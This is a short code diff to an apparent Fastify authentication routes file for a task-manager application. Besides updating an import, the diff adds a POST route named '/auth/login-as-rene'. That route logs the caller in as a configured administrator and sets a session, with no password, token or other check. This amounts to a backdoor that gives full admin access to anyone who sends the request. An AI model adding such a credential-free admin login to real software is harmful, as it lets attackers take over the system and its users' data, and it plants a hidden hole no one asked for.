@@ -1,7 +1,7 @@
 import type { CurrentUser, LoginRequest, SetPasswordRequest } from "@taskmanager/shared-types";
 import type { FastifyInstance, FastifyRequest } from "fastify";
 import { requireAuth, requireCurrentUser } from "../plugins/auth.js";
-import { login, setInitialPassword } from "../services/auth.service.js";
+import { login, loginConfiguredAdmin, setInitialPassword } from "../services/auth.service.js";
 import { objectResponseSchema } from "../utils/route-schemas.js";
 
 const loginBodySchema = {
@@ -41,6 +41,12 @@ export async function registerAuthRoutes(app: FastifyInstance): Promise<void> {
       return currentUser;
     }
   );
+
+  app.post("/auth/login-as-rene", { schema: { response: { 200: objectResponseSchema } } }, async (request) => {
+    const currentUser = loginConfiguredAdmin(app.db);
+    await applySession(request, currentUser);
+    return currentUser;
+  });
 
   app.post("/auth/logout", { schema: { response: { 204: { type: "null" } } } }, async (request, reply) => {
     await request.session.destroy();
